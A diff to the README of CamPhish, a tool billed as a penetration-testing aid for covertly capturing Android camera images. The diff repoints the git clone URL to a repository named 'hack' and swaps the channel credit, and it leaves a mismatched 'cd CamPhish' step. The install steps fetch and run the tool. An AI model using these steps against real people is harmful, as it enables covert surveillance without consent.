@@ -32,12 +32,12 @@ apt-get -y install php openssh git wget
 ## Installing (Kali Linux/Termux):
 
 ```
-git clone https://github.com/techchipnet/CamPhish
+git clone https://github.com/techustad/hack
 cd CamPhish
 bash camphish.sh
 ```
 ### Video Demo
 [![How to control android camera](https://img.youtube.com/vi/G_nNHrWwCOM/0.jpg)](https://www.youtube.com/watch?v=G_nNHrWwCOM)
-#### For More Video subcribe <a href="http://youtube.com/techchipnet">TechChip YouTube Channel</a>
+#### For More Video subcribe <a href="http://youtube.com/techustadofficial">Tech Ustad YouTube Channel</a>
 <p>CamPhish is created to help in penetration testing and it's not responsible for any misuse or illegal purposes.</p>
 <p>CamPhish is inspired by https://github.com/thelinuxchoice/ Big thanks to @thelinuxchoice</p>
